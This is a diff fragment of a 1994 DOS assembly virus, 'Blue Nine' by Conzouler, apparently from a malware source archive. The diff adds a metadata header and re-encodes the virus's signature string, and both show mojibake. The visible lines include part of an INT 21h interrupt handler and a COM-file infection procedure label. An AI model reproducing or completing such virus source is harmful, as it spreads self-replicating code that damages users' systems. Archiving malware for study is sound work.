@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; The Blue Nine virus... (c) 94 Conzouler
 
 ; Resident in conventional memory
@@ -162,7 +173,7 @@ chn6:   cmp     ah, 3Fh                 ; read from handle
 chnx:   jmp     Org21                   ; Chain to dos
 
 
-        db      '   úù-  Blue Nine Virus by Conzouler 1994  -ùú   '
+        db      '   ï¿½ï¿½-  Blue Nine Virus by Conzouler 1994  -ï¿½ï¿½   '
 
 
 cominfect       proc
